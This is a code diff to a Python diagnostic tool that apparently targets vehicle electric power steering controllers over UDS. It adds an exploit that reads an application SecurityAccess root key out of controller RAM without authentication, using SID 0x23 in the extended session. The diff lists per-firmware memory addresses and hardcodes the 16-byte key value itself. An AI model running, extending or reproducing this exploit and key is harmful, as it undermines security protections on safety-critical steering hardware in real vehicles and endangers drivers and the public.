@@ -28,6 +28,7 @@ from tsk.lib.env import is_agnos
 from tsk.lib.extractor import NotAGNOSError, TSKExtractor
 from tsk.lib.dump_dataflash import ADDR, DUMP_START, KNOWN_KEY_OFFSET
 from tsk.lib.dump_diag import CANDIDATE_BUSES
+from tsk.lib.ram_exec_geometry import normalize_f181
 
 ALFID_MEMORY_ID = 0x15
 RAM_ID = 1
@@ -38,6 +39,36 @@ READ_TIMEOUT = 1.0
 KEY_ADDR = DUMP_START + KNOWN_KEY_OFFSET       # 0xFF206E14; protected on 8965B4512000
 BOOT_PAYLOAD_KEY_RESIDUE = 0xFEBF2D08         # bootloader DID 0x0201 input buffer
 ACTUATION_OBSERVATION = 0xFEBE6D28            # recovered d/q-reference observation bytes
+
+# KEYLESS-006: on these exact tracked images, normal application startup copies the
+# complete application 0x03/0x04 SecurityAccess root into a LocalRAM interval that
+# SID 0x23 can read in EXTENDED session without SecurityAccess.  Keep this exact-F181
+# keyed: a family/prefix match is not evidence that another calibration uses the same
+# destination or read exclusions.
+APPLICATION_SA_ROOT_EXPECTED = bytes.fromhex("893e08418c741ffa2a9c044bffa55813")
+APPLICATION_SA_MIRRORS = {
+  "8965B4512000": 0xFEBF7BE0,
+  "8965H1202000": 0xFEBF7B80,
+  "8965F1208000": 0xFEBF7B80,
+}
+
+
+def application_sa_mirror_for_f181(f181: bytes | bytearray | str) -> int | None:
+  return APPLICATION_SA_MIRRORS.get(normalize_f181(f181))
+
+
+def application_sa_recovery_plan(f181: bytes | bytearray | str) -> dict:
+  normalized = normalize_f181(f181)
+  address = APPLICATION_SA_MIRRORS.get(normalized)
+  return {
+    "f181": normalized,
+    "supported": address is not None,
+    "address": f"0x{address:08x}" if address is not None else "",
+    "memory_id": RAM_ID if address is not None else None,
+    "size": len(APPLICATION_SA_ROOT_EXPECTED) if address is not None else 0,
+    "expected_root": APPLICATION_SA_ROOT_EXPECTED.hex() if address is not None else "",
+    "evidence": "KEYLESS-006 exact-F181 startup LocalRAM mirror" if address is not None else "",
+  }
 
 # Firmware-verified 8965B4512000 service policy. These are used to annotate the
 # result, not to suppress cross-calibration read attempts: another target may have
@@ -139,7 +170,7 @@ def read_key_region(progress_cb=None) -> dict:
   reads: list[dict] = []
   result = {
     "status": "failed", "panda": "", "eps_bus": -1, "f181": "", "f181_hex": "",
-    "reads": reads, "message": "",
+    "reads": reads, "application_sa_recovery": {}, "message": "",
   }
 
   def nrc(code) -> str:
@@ -169,6 +200,8 @@ def read_key_region(progress_cb=None) -> dict:
   identity = bytes.fromhex(str(route.get("identity", ""))) if route.get("identity") else b""
   result["f181_hex"] = identity.hex()
   result["f181"] = "".join(chr(c) if 32 <= c < 127 else "." for c in identity)
+  app_sa_plan = application_sa_recovery_plan(identity)
+  result["application_sa_recovery"] = dict(app_sa_plan)
 
   def mk():
     return UdsClient(panda, route["tx"], route["rx"], eps_bus,
@@ -205,12 +238,42 @@ def read_key_region(progress_cb=None) -> dict:
 
   for target in TARGETS:
     do_read(*target)
+  app_sa_address = application_sa_mirror_for_f181(identity)
+  if app_sa_address is not None:
+    do_read("application SecurityAccess root mirror", "memory-id", RAM_ID, app_sa_address,
+            len(APPLICATION_SA_ROOT_EXPECTED))
 
   got = [row for row in reads if row["ok"]]
+  app_sa_row = next((row for row in reads if row["name"] == "application SecurityAccess root mirror"), None)
+  if app_sa_row is not None:
+    recovered = app_sa_row.get("detail", "") if app_sa_row.get("ok") else ""
+    result["application_sa_recovery"].update(
+      attempted=True,
+      recovered_root=recovered,
+      matches_expected=bool(recovered and recovered.lower() == APPLICATION_SA_ROOT_EXPECTED.hex()),
+      read_ok=bool(app_sa_row.get("ok")),
+    )
+  else:
+    result["application_sa_recovery"].update(
+      attempted=False, recovered_root="", matches_expected=False, read_ok=False,
+    )
   result["status"] = "read" if got else "denied"
   exact = [row for row in got if row["shape"] == "memory-id"]
   residue = next((row for row in exact if row["name"] == "boot payload-key residue"), None)
-  if residue is not None:
+  app_sa = result["application_sa_recovery"]
+  if app_sa.get("read_ok") and app_sa.get("matches_expected"):
+    result["message"] = " ".join((
+      "The exact-F181 KEYLESS-006 application SecurityAccess mirror was read before SecurityAccess",
+      "and matches the firmware-pinned 0x03/0x04 root. No SEND_KEY or write was sent.",
+      "The independent bootloader 0x01/0x02 SecurityAccess root is not disclosed by this read.",
+    ))
+  elif app_sa.get("read_ok"):
+    result["message"] = " ".join((
+      "The exact-F181 application SecurityAccess mirror was readable, but its 16 bytes differ from",
+      "the firmware-pinned root for this tracked image. Preserve the evidence and do not send a key",
+      "until the target identity/provenance is re-checked.",
+    ))
+  elif residue is not None:
     result["message"] = " ".join((
       "The firmware-derived memory-ID SID 0x23 path is live, including FEBF2D08.",
       "Those 16 bytes are the bootloader DID-0201 payload-key input buffer; preserve this result",
